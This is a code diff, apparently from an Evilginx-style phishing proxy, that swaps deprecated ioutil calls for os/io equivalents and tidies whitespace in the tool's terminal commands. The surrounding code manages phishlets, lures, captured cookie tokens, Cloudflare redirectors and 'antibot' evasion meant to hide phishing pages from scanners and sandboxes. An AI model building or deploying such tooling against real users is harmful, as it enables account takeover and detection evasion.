@@ -8,7 +8,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
-	"io/ioutil"
 	"math/rand"
 	"net/url"
 	"os"
@@ -256,8 +255,8 @@ func (t *Terminal) handleConfig(args []string) error {
 		if webAdminPass == "" {
 			webAdminPass = "(set at first run)"
 		}
-		keys := []string{"domains", "external_ipv4", "bind_ipv4", "http_port", "https_port", "dns_port", "unauth_url", "autocert", "redirectors_dir", "post_redirectors_dir", "lure_strategy", "web_admin_url", "web_admin password", "gophish integrated_admin_url", /*"gophish admin_url",*/ /*"gophish api_key",*/ "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
-		vals := []string{domainsSummary, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpPort), strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, redirectorsDir, postRedirectorsDir, lureStrategy, webAdminUrl, webAdminPass, t.cfg.GetGoPhishIntegratedAdminUrl(), /*t.cfg.GetGoPhishAdminUrl(),*/ /*t.cfg.GetGoPhishApiKey(),*/ gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
+		keys := []string{"domains", "external_ipv4", "bind_ipv4", "http_port", "https_port", "dns_port", "unauth_url", "autocert", "redirectors_dir", "post_redirectors_dir", "lure_strategy", "web_admin_url", "web_admin password", "gophish integrated_admin_url" /*"gophish admin_url",*/ /*"gophish api_key",*/, "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
+		vals := []string{domainsSummary, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpPort), strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, redirectorsDir, postRedirectorsDir, lureStrategy, webAdminUrl, webAdminPass, t.cfg.GetGoPhishIntegratedAdminUrl() /*t.cfg.GetGoPhishAdminUrl(),*/ /*t.cfg.GetGoPhishApiKey(),*/, gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
@@ -855,7 +854,7 @@ func (t *Terminal) handleJA3(args []string) error {
 
 			// Write to file
 			filename := fmt.Sprintf("ja3_signatures_%s.json", time.Now().Format("20060102_150405"))
-			err = ioutil.WriteFile(filename, output, 0644)
+			err = os.WriteFile(filename, output, 0644)
 			if err != nil {
 				return fmt.Errorf("failed to write file: %v", err)
 			}
@@ -1795,7 +1794,7 @@ func (t *Terminal) handleAntibot(args []string) error {
 		if pn == 1 {
 			return fmt.Errorf("invalid antibot command or syntax: %s", args[0])
 		}
-		
+
 		switch args[0] {
 		case "enabled":
 			switch args[1] {
@@ -2851,7 +2850,7 @@ func (t *Terminal) handleCloudflare(args []string) error {
 
 		// Write to file
 		filename := fmt.Sprintf("cloudflare-worker-%s-%s.js", workerType, time.Now().Format("20060102-150405"))
-		err = ioutil.WriteFile(filename, []byte(workerScript), 0644)
+		err = os.WriteFile(filename, []byte(workerScript), 0644)
 		if err != nil {
 			return fmt.Errorf("failed to write worker script: %v", err)
 		}
@@ -3078,7 +3077,7 @@ func (t *Terminal) handleCloudflare(args []string) error {
 			if subdomain != "" {
 				workerURL := fmt.Sprintf("https://%s.%s.workers.dev", workerName, subdomain)
 				log.Info("worker URL: %s", higreen.Sprint(workerURL))
-				
+
 				// Update the config with the proper subdomain if it differed
 				if subdomain != cfConfig.WorkerSubdomain {
 					t.cfg.SetCloudflareWorkerSubdomain(subdomain)
@@ -3489,10 +3488,10 @@ func (t *Terminal) createHelp() {
 
 	h.AddCommand("antibot", "general", "manage all antibot features", "Configure all antibot functionalities, including JA3, CAPTCHA, Sandbox, and Polymorphic engines.\n\nQuickstart:\n  enable:         antibot enabled true\n  set action:     antibot action <block|spoof>\n  enable captcha: antibot captcha enable on\n  enable sandbox: antibot sandbox enable on\n  polymorphic:    antibot polymorphic enable on", LAYER_TOP,
 		readline.PcItem("antibot",
-			readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), 
-			readline.PcItem("action", readline.PcItem("block"), readline.PcItem("spoof")), 
-			readline.PcItem("spoof_url"), 
-			readline.PcItem("threshold"), 
+			readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")),
+			readline.PcItem("action", readline.PcItem("block"), readline.PcItem("spoof")),
+			readline.PcItem("spoof_url"),
+			readline.PcItem("threshold"),
 			readline.PcItem("override_ips", readline.PcItem("list"), readline.PcItem("add"), readline.PcItem("remove")),
 			readline.PcItem("ja3", readline.PcItem("stats"), readline.PcItem("signatures"), readline.PcItem("add"), readline.PcItem("export")),
 			readline.PcItem("captcha", readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("provider"), readline.PcItem("configure"), readline.PcItem("require", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("test")),
@@ -3508,7 +3507,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("antibot", []string{"override_ips"}, "override_ips <list|add|remove>", "manage IPs that bypass antibot detection")
 	h.AddSubCommand("antibot", []string{"override_ips", "add"}, "override_ips add <ip>", "whitelist IP to bypass antibot checks")
 	h.AddSubCommand("antibot", []string{"override_ips", "remove"}, "override_ips remove <ip>", "remove IP from antibot whitelist")
-	
+
 	h.AddSubCommand("antibot", []string{"ja3"}, "ja3", "show JA3/JA3S fingerprinting statistics")
 	h.AddSubCommand("antibot", []string{"ja3", "stats"}, "ja3 stats", "show detailed JA3 capture and detection statistics")
 	h.AddSubCommand("antibot", []string{"ja3", "signatures"}, "ja3 signatures", "list all known bot JA3 signatures")
@@ -3521,7 +3520,6 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("antibot", []string{"captcha", "configure"}, "captcha configure <provider> <site_key> <secret_key> [options]", "configure a CAPTCHA provider")
 	h.AddSubCommand("antibot", []string{"captcha", "require"}, "captcha require <on|off>", "require CAPTCHA verification for all lures")
 	h.AddSubCommand("antibot", []string{"captcha", "test"}, "captcha test", "display test page URL for verifying CAPTCHA integration")
-
 
 	h.AddSubCommand("antibot", []string{"traffic-shaping"}, "traffic-shaping", "show traffic shaping configuration and metrics")
 	h.AddSubCommand("antibot", []string{"traffic-shaping", "enable"}, "traffic-shaping enable <on|off>", "enable or disable traffic shaping")
@@ -3607,8 +3605,6 @@ func (t *Terminal) cookieTokensToJSON(tokens map[string]map[string]*database.Coo
 	json, _ := json.Marshal(cookies)
 	return string(json)
 }
-
-
 
 func (t *Terminal) checkStatus() {
 	if t.cfg.GetBaseDomain() == "" {
@@ -3716,8 +3712,6 @@ func (t *Terminal) sprintPhishletStatus(site string) string {
 	return AsTable(cols, rows)
 }
 
-
-
 func (t *Terminal) sprintLures() string {
 	higreen := color.New(color.FgHiGreen)
 	hiblue := color.New(color.FgHiBlue)
@@ -3765,7 +3759,7 @@ func (t *Terminal) phishletPrefixCompleter(args string) []string {
 func (t *Terminal) postRedirectorsPrefixCompleter(args string) []string {
 	dir := t.cfg.GetPostRedirectorsDir()
 
-	files, err := ioutil.ReadDir(dir)
+	files, err := os.ReadDir(dir)
 	if err != nil {
 		return []string{}
 	}
@@ -3795,7 +3789,7 @@ func (t *Terminal) postRedirectorsPrefixCompleter(args string) []string {
 func (t *Terminal) redirectorsPrefixCompleter(args string) []string {
 	dir := t.cfg.GetRedirectorsDir()
 
-	files, err := ioutil.ReadDir(dir)
+	files, err := os.ReadDir(dir)
 	if err != nil {
 		return []string{}
 	}
@@ -3922,7 +3916,7 @@ func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string,
 			return ret, ret_params, err
 		}
 	case "json":
-		data, err := ioutil.ReadAll(bufio.NewReader(f))
+		data, err := io.ReadAll(bufio.NewReader(f))
 		if err != nil {
 			return ret, ret_params, err
 		}
@@ -4107,8 +4101,6 @@ func (t *Terminal) createPhishUrl(base_url string, params *url.Values) string {
 	}
 	return ret
 }
-
-
 
 // getLureBaseURL builds the phishing URL for a lure
 func (t *Terminal) getLureBaseURL(l *Lure, phishletName string) (string, error) {
